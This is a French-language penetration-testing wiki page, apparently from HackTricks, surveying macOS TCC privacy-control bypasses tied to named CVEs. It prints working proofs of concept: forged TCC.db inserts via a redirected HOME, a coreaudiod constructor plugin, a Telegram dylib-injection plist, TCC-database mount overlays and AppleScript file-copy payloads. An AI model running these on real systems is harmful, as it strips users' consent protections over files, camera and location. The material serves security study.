# Contournements de TCC sur macOS

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? Ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Par fonctionnalité

### Contournement d'écriture

Ce n'est pas un contournement, c'est simplement la façon dont TCC fonctionne : **il ne protège pas contre l'écriture**. Si le Terminal **n'a pas accès à la lecture du Bureau d'un utilisateur, il peut toujours y écrire** :
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
L'**attribut étendu `com.apple.macl`** est ajouté au nouveau **fichier** pour donner à l'**application créatrice** l'accès en lecture.

### Contournement SSH

Par défaut, un accès via **SSH avait "Accès complet au disque"**. Pour le désactiver, vous devez le répertorier mais le désactiver (le supprimer de la liste ne supprimera pas ces privilèges) :

![](<../../../../../.gitbook/assets/image (569).png>)

Vous trouverez ici des exemples de **malwares ayant réussi à contourner cette protection** :

* [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

{% hint style="danger" %}
Notez que maintenant, pour pouvoir activer SSH, vous avez besoin de **l'accès complet au disque**.
{% endhint %}

### Gérer les extensions - CVE-2022-26767

L'attribut **`com.apple.macl`** est attribué aux fichiers pour donner à une **certaine application des autorisations de lecture**. Cet attribut est défini lorsque vous **glissez-déposez** un fichier sur une application, ou lorsque vous **double-cliquez** sur un fichier pour l'ouvrir avec l'**application par défaut**.

Par conséquent, un utilisateur pourrait **enregistrer une application malveillante** pour gérer toutes les extensions et appeler les services de lancement pour **ouvrir** n'importe quel fichier (ainsi, le fichier malveillant aura l'autorisation de le lire).

### iCloud

Avec l'autorisation **`com.apple.private.icloud-account-access`**, il est possible de communiquer avec le service XPC **`com.apple.iCloudHelper`** qui **fournira des jetons iCloud**.

**iMovie** et **Garageband** avaient cette autorisation et d'autres qui le permettaient.

Pour plus d'**informations** sur l'exploitation pour **obtenir des jetons iCloud** à partir de cette autorisation, consultez la présentation : [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

Une application avec l'autorisation **`kTCCServiceAppleEvents`** pourra **contrôler d'autres applications**. Cela signifie qu'elle pourrait être en mesure d'**abuser des autorisations accordées aux autres applications**.

Pour plus d'informations sur les scripts Apple, consultez :

{% content-ref url="macos-apple-scripts.md" %}
[macos-apple-scripts.md](macos-apple-scripts.md)
{% endcontent-ref %}

Par exemple, si une application a **l'autorisation d'automatisation sur `iTerm`**, par exemple dans cet exemple **`Terminal`** a accès à iTerm :

<figure><img src="../../../../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>

#### Sur iTerm

Terminal, qui n'a pas FDA, peut appeler iTerm, qui l'a, et l'utiliser pour effectuer des actions :

{% code title="iterm.script" %}
```applescript
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```
{% endcode %}
```bash
osascript iterm.script
```
#### Sur Finder

Ou si une application a accès à Finder, elle pourrait utiliser un script comme celui-ci :
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Par comportement de l'application

### CVE-2020-9934 - TCC <a href="#c19b" id="c19b"></a>

Le démon **tccd** de l'espace utilisateur utilise la variable d'environnement **`HOME`** pour accéder à la base de données des utilisateurs TCC à partir de : **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Selon [cette publication sur Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) et parce que le démon TCC s'exécute via `launchd` dans le domaine de l'utilisateur actuel, il est possible de **contrôler toutes les variables d'environnement** qui lui sont transmises.\
Ainsi, un **attaquant pourrait définir la variable d'environnement `$HOME`** dans **`launchctl`** pour pointer vers un **répertoire contrôlé**, **redémarrer** le démon **TCC**, puis **modifier directement la base de données TCC** pour s'attribuer **tous les privilèges TCC disponibles** sans jamais demander l'autorisation à l'utilisateur final.\
Preuve de concept (PoC) :
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes avait accès aux emplacements protégés par TCC, mais lorsqu'une note est créée, elle est créée dans un emplacement non protégé. Ainsi, vous pouviez demander à Notes de copier un fichier protégé dans une note (donc dans un emplacement non protégé) et ensuite accéder au fichier :

<figure><img src="../../../../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

Le binaire `/usr/libexec/lsd` avec la bibliothèque `libsecurity_translocate` avait l'autorisation `com.apple.private.nullfs_allow` qui lui permettait de créer un montage **nullfs** et avait l'autorisation `com.apple.private.tcc.allow` avec **`kTCCServiceSystemPolicyAllFiles`** pour accéder à tous les fichiers.

Il était possible d'ajouter l'attribut de quarantaine à "Library", d'appeler le service XPC **`com.apple.security.translocation`** et ensuite il mapperait Library vers **`$TMPDIR/AppTranslocation/d/d/Library`** où tous les documents à l'intérieur de Library pouvaient être **accessibles**.

### CVE-2023-38571 - Music & TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Music`** a une fonctionnalité intéressante : lorsqu'il est en cours d'exécution, il **importe** les fichiers déposés dans **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** dans la "bibliothèque multimédia" de l'utilisateur. De plus, il appelle quelque chose comme : **`rename(a, b);`** où `a` et `b` sont :

* `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
* `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3`

Ce comportement **`rename(a, b);`** est vulnérable à une **condition de concurrence**, car il est possible de placer un faux fichier **TCC.db** à l'intérieur du dossier `Automatically Add to Music.localized`, puis lorsque le nouveau dossier (b) est créé pour copier le fichier, le supprimer et le pointer vers **`~/Library/Application Support/com.apple.TCC`**/.

### SQLITE\_SQLLOG\_DIR - CVE-2023-32422

Si **`SQLITE_SQLLOG_DIR="chemin/dossier"`**, cela signifie essentiellement que **toute base de données ouverte est copiée dans ce chemin**. Dans cette CVE, ce contrôle a été utilisé de manière abusive pour **écrire** à l'intérieur d'une **base de données SQLite** qui va être **ouverte par un processus avec FDA la base de données TCC**, puis abuser de **`SQLITE_SQLLOG_DIR`** avec un **lien symbolique dans le nom de fichier** afin que lorsque cette base de données est **ouverte**, la base de données utilisateur **TCC.db est écrasée** par celle qui est ouverte.\
[**Plus d'informations ici**](https://youtu.be/f1HA5QhLQ7Y?t=20548).

### **SQLITE\_AUTO\_TRACE**

Si la variable d'environnement **`SQLITE_AUTO_TRACE`** est définie, la bibliothèque **`libsqlite3.dylib`** commencera à **enregistrer** toutes les requêtes SQL. De nombreuses applications utilisaient cette bibliothèque, il était donc possible de journaliser toutes leurs requêtes SQLite.

Plusieurs applications Apple utilisaient cette bibliothèque pour accéder à des informations protégées par TCC.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### Apple Remote Desktop

En tant que root, vous pouvez activer ce service et l'agent ARD aura un accès complet au disque, ce qui peut ensuite être utilisé par un utilisateur pour copier une nouvelle base de données utilisateur TCC.

## Par **NFSHomeDirectory**

TCC utilise une base de données dans le dossier HOME de l'utilisateur pour contrôler l'accès aux ressources spécifiques à l'utilisateur à **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Par conséquent, si l'utilisateur parvient à redémarrer TCC avec une variable d'environnement $HOME pointant vers un **dossier différent**, l'utilisateur peut créer une nouvelle base de données TCC dans **/Library/Application Support/com.apple.TCC/TCC.db** et tromper TCC pour accorder n'importe quelle permission TCC à n'importe quelle application.

{% hint style="success" %}
Notez qu'Apple utilise le paramètre stocké dans le profil de l'utilisateur dans l'attribut **`NFSHomeDirectory`** pour la valeur de `$HOME`, donc si vous compromettez une application avec des autorisations pour modifier cette valeur (**`kTCCServiceSystemPolicySysAdminFiles`**), vous pouvez **exploiter** cette option avec une contournement de TCC.
{% endhint %}

### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](./#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

Le **premier POC** utilise [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) et [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) pour modifier le dossier **HOME** de l'utilisateur.

1. Obtenez un blob _csreq_ pour l'application cible.
2. Plantez un faux fichier _TCC.db_ avec les autorisations requises et le blob _csreq_.
3. Exportez l'entrée des services de répertoire de l'utilisateur avec [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Modifiez l'entrée des services de répertoire pour changer le répertoire principal de l'utilisateur.
5. Importez l'entrée des services de répertoire modifiée avec [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Arrêtez le processus _tccd_ de l'utilisateur et redémarrez-le.

Le deuxième POC utilisait **`/usr/libexec/configd`** qui avait `com.apple.private.tcc.allow` avec la valeur `kTCCServiceSystemPolicySysAdminFiles`.\
Il était possible d'exécuter **`configd`** avec l'option **`-t`**, un attaquant pouvait spécifier un **Bundle personnalisé à charger**. Par conséquent, l'exploit **remplace** la méthode **`dsexport`** et **`dsimport`** de modification du répertoire principal de l'utilisateur par une **injection de code dans `configd`**.

Pour plus d'informations, consultez le [**rapport original**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).

## Par injection de processus

Il existe différentes techniques pour injecter du code dans un processus et exploiter ses privilèges TCC :

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

De plus, l'injection de processus la plus courante pour contourner TCC se fait via des **plugins (chargement de bibliothèque)**.\
Les plugins sont du code supplémentaire généralement sous forme de bibliothèques ou de plist, qui seront **chargés par l'application principale** et s'exécuteront dans son contexte. Par conséquent, si l'application principale avait accès aux fichiers restreints par TCC (via des autorisations accordées ou des entitlements), le **code personnalisé l'aura également**.

### CVE-2020-27937 - Directory Utility

L'application `/System/Library/CoreServices/Applications/Directory Utility.app` avait l'entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, chargeait des plugins avec l'extension **`.daplug`** et n'avait pas le runtime **hardened**.

Pour exploiter cette CVE, le **`NFSHomeDirectory`** est **modifié** (en abusant de l'entitlement précédent) afin de pouvoir **prendre le contrôle de la base de données TCC de l'utilisateur** pour contourner TCC.

Pour plus d'informations, consultez le [**rapport original**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).

### CVE-2020-29621 - Coreaudiod

Le binaire **`/usr/sbin/coreaudiod`** avait les entitlements `com.apple.security.cs.disable-library-validation` et `com.apple.private.tcc.manager`. Le premier permettait l'injection de code et le second lui donnait accès à la **gestion de TCC**.

Ce binaire permettait de charger des **plug-ins tiers** à partir du dossier `/Library/Audio/Plug-Ins/HAL`. Par conséquent, il était possible de **charger un plugin et d'exploiter les permissions TCC** avec ce POC :
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Pour plus d'informations, consultez le [**rapport original**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### Plug-ins de la couche d'abstraction des périphériques (DAL)

Les applications système qui ouvrent un flux de caméra via Core Media I/O (applications avec **`kTCCServiceCamera`**) chargent **dans le processus ces plug-ins** situés dans `/Library/CoreMediaIO/Plug-Ins/DAL` (non restreints par SIP).

Il suffit de stocker une bibliothèque avec le **constructeur** commun pour **injecter du code**.

Plusieurs applications Apple étaient vulnérables à cela.

### Firefox

L'application Firefox avait les autorisations `com.apple.security.cs.disable-library-validation` et `com.apple.security.cs.allow-dyld-environment-variables`:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Pour plus d'informations sur la façon d'exploiter facilement cela, consultez le [**rapport original**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

Le binaire `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` avait les autorisations **`com.apple.private.tcc.allow`** et **`com.apple.security.get-task-allow`**, ce qui permettait d'injecter du code dans le processus et d'utiliser les privilèges TCC.

### CVE-2023-26818 - Telegram

Telegram avait les autorisations **`com.apple.security.cs.allow-dyld-environment-variables`** et **`com.apple.security.cs.disable-library-validation`**, il était donc possible de l'exploiter pour **accéder à ses permissions**, comme l'enregistrement avec la caméra. Vous pouvez [**trouver la charge utile dans l'article**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Notez comment utiliser la variable d'environnement pour charger une bibliothèque, un **plist personnalisé** a été créé pour injecter cette bibliothèque et **`launchctl`** a été utilisé pour la lancer :
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Par des invocations ouvertes

Il est possible d'invoquer **`open`** même lorsque le sandbox est activé.

### Scripts Terminal

Il est assez courant de donner un **Accès complet au disque (FDA)** au terminal, du moins sur les ordinateurs utilisés par des personnes techniques. Et il est possible d'invoquer des scripts **`.terminal`** en l'utilisant.

Les scripts **`.terminal`** sont des fichiers plist comme celui-ci avec la commande à exécuter dans la clé **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Une application pourrait écrire un script terminal dans un emplacement tel que /tmp et le lancer avec une commande telle que :
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## En montant

### CVE-2020-9771 - Contournement de TCC et élévation de privilèges avec mount\_apfs

**N'importe quel utilisateur** (même non privilégié) peut créer et monter une sauvegarde de machine à remonter le temps et **accéder à TOUS les fichiers** de cette sauvegarde.\
Le **seul privilège** requis est que l'application utilisée (comme `Terminal`) ait **un accès complet au disque** (FDA) (`kTCCServiceSystemPolicyAllfiles`), qui doit être accordé par un administrateur.

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

Une explication plus détaillée peut être [**trouvée dans le rapport original**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - Montage sur le fichier TCC

Même si le fichier TCC DB est protégé, il était possible de **monter un nouveau fichier TCC.db** dans le répertoire :

{% code overflow="wrap" %}
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```
{% endcode %}
```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Consultez l'**exploit complet** dans le [**rapport original**](https://theevilbit.github.io/posts/cve-2021-30808/).

### asr

L'outil **`/usr/sbin/asr`** permettait de copier l'ensemble du disque et de le monter ailleurs en contournant les protections TCC.

### Services de localisation

Il existe une troisième base de données TCC dans **`/var/db/locationd/clients.plist`** pour indiquer les clients autorisés à **accéder aux services de localisation**.\
Le dossier **`/var/db/locationd/` n'était pas protégé contre le montage de DMG**, il était donc possible de monter notre propre plist.

## Par les applications de démarrage

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

## Par grep

À plusieurs reprises, des fichiers stockent des informations sensibles telles que des e-mails, des numéros de téléphone, des messages... dans des emplacements non protégés (ce qui constitue une vulnérabilité chez Apple).

<figure><img src="../../../../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>

## Clics synthétiques

Cela ne fonctionne plus, mais cela [**a fonctionné dans le passé**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Une autre méthode utilisant les [**événements CoreGraphics**](https://objectivebythesea.org/v2/talks/OBTS\_v2\_Wardle.pdf) :

<figure><img src="../../../../../.gitbook/assets/image (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

## Référence

* [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
* [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
* [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Vous travaillez dans une **entreprise de cybersécurité** ? Vous souhaitez voir votre **entreprise annoncée dans HackTricks** ? ou souhaitez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
